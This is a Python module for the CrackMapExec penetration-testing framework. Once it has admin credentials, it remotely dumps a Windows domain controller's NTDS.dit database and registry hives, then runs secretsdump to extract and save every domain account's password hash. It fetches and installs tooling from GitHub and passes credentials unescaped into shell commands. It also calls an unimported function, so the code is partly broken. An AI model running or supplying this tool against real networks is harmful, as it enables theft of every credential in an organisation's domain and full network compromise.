#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ntdsutil module for CME python3
# author of the module : github.com/e1abrador
# secretsdump: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
# ntdsutil: https://github.com/zblurx/ntdsutil.py
# Inspired in: https://twitter.com/mpgn_x64/status/1638998623701684247

import subprocess
import random
import string
import os
import datetime
import shutil

class CMEModule:
    name = "ntdsutil"
    description = "Remotely dump NTDS using NTDSUTIL to avoid crashing the DC on 2019"
    supported_protocols = ["smb"]
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        """

    def on_admin_login(self, context, connection):

        domain = connection.domain
        username = connection.username
        host = connection.host
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")
        hostname = connection.hostname

        # Clone and install ntdsutil.py
        repo_url = "https://github.com/zblurx/ntdsutil.py"
        repo_path = "/opt/ntdsutil.py"

        if not os.path.exists(repo_path):
            subprocess.run(["git", "clone", repo_url, repo_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cmd = ["python3", f"{repo_path}/setup.py", "install"]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Clone and install impacket
        repo_url = "https://github.com/SecureAuthCorp/impacket"
        repo_path = "/opt/impacket"

        if not os.path.exists(repo_path):
            subprocess.run(["git", "clone", repo_url, repo_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cmd = ["python3", f"{repo_path}/setup.py", "install"]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        repo_name = "ntdsutil.py"
        repo_path = f"/opt/{repo_name}"

        # NTLM authentication
        if password == "":
            context.log.info("Using NTLM authentication.")
            context.log.info("Dumping ntds with ntdsutil.exe.")
            random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            os.system(f"python3 {repo_path}/ntdsutil.py {domain}/{username}:{password}@{host} -hashes {nthash} -outputdir /tmp/{random_string} >/dev/null 2>&1")
            if os.path.exists(f"/tmp/{random_string}/Active Directory/ntds.dit"):
                context.log.highlight(f"NTDS.dit copied at /tmp/{random_string}/Active Directory/ntds.dit")
                if os.path.exists(f"/tmp/{random_string}/registry/SYSTEM"):
                    context.log.highlight(f"SYSTEM copied at /tmp/{random_string}/registry/SYSTEM")
                    if os.path.exists(f"/tmp/{random_string}/registry/SECURITY"):
                        context.log.highlight(f"SECURITY copied at /tmp/{random_string}/registry/SECURITY")
                        context.log.success(f"Dumping the NTDS, this could take a while so go grab a redbull...")
                        os.system(f"impacket-secretsdump -system /tmp/{random_string}/registry/SYSTEM -ntds '/tmp/{random_string}/Active Directory/ntds.dit' LOCAL -outputfile /tmp/{random_string}/hashes.txt >/dev/null 2>&1")
                        with open(f"/tmp/{random_string}/hashes.txt.ntds", "r") as f:
                            for line in f:
                                context.log.highlight(line.strip())
                        line_count = 0
                        with open(f"/tmp/{random_string}/hashes.txt.ntds", "r") as f:
                            for line in f:
                                line_count += 1
                        now = datetime.datetime.now()
                        formatted_date = now.strftime("%Y_%m_%d_%H%M%S")
                        old_path = '/tmp/' + random_string + '/hashes.txt.ntds'
                        full_filename = hostname + '_' + host + "_" + formatted_date + '.ntds'
                        new_path = '/tmp/' + random_string + "/" + full_filename
                        os.rename(old_path, new_path)
                        destination_path = os.path.join(os.path.expanduser('~'), '.cme', 'logs')
                        shutil.move(new_path, destination_path)
                        dump_path = destination_path + "/" + full_filename
                        context.log.success(f"Dumped {highlight(line_count)} NTDS hashes to {dump_path}")
                        remove_path = '/tmp/' + random_string
                        shutil.rmtree(remove_path)
                        context.log.info(f"Removed successfuly {remove_path}")
                    else:
                        context.log.error('It was not possible to download SECURITY')
                else:
                    context.log.error('It was not possible to download SYSTEM')
            else:
                context.log.error('It was not possible to download ntds.dit')
        # Password authentication
        else:
            context.log.info("Using password authentication.")
            context.log.info("Dumping ntds with ntdsutil.exe.")
            random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            os.system(f"python3 {repo_path}/ntdsutil.py {domain}/{username}:{password}@{host} -outputdir /tmp/{random_string} >/dev/null 2>&1")
            if os.path.exists(f"/tmp/{random_string}/Active Directory/ntds.dit"):
                context.log.highlight(f"NTDS.dit copied at /tmp/{random_string}/Active Directory/ntds.dit")
                if os.path.exists(f"/tmp/{random_string}/registry/SYSTEM"):
                    context.log.highlight(f"SYSTEM copied at /tmp/{random_string}/registry/SYSTEM")
                    if os.path.exists(f"/tmp/{random_string}/registry/SECURITY"):
                        context.log.highlight(f"SECURITY copied at /tmp/{random_string}/registry/SECURITY")
                        context.log.success(f"Dumping the NTDS, this could take a while so go grab a redbull...")
                        os.system(f"impacket-secretsdump -system /tmp/{random_string}/registry/SYSTEM -ntds '/tmp/{random_string}/Active Directory/ntds.dit' LOCAL -outputfile /tmp/{random_string}/hashes.txt >/dev/null 2>&1")
                        with open(f"/tmp/{random_string}/hashes.txt.ntds", "r") as f:
                            for line in f:
                                context.log.highlight(line.strip())
                        line_count = 0
                        with open(f"/tmp/{random_string}/hashes.txt.ntds", "r") as f:
                            for line in f:
                                line_count += 1
                        now = datetime.datetime.now()
                        formatted_date = now.strftime("%Y_%m_%d_%H%M%S")
                        old_path = '/tmp/' + random_string + '/hashes.txt.ntds'
                        full_filename = hostname + '_' + host + "_" + formatted_date + '.ntds'
                        new_path = '/tmp/' + random_string + "/" + full_filename
                        os.rename(old_path, new_path)
                        destination_path = os.path.join(os.path.expanduser('~'), '.cme', 'logs')
                        shutil.move(new_path, destination_path)
                        dump_path = destination_path + "/" + full_filename
                        context.log.success(f"Dumped {highlight(line_count)} NTDS hashes to {dump_path}")
                        remove_path = '/tmp/' + random_string
                        shutil.rmtree(remove_path)
                        context.log.info(f"Removed successfuly {remove_path}")
                    else:
                        context.log.error('It was not possible to download SECURITY')
                else:
                    context.log.error('It was not possible to download SYSTEM')
            else:
                context.log.error('It was not possible to download ntds.dit')
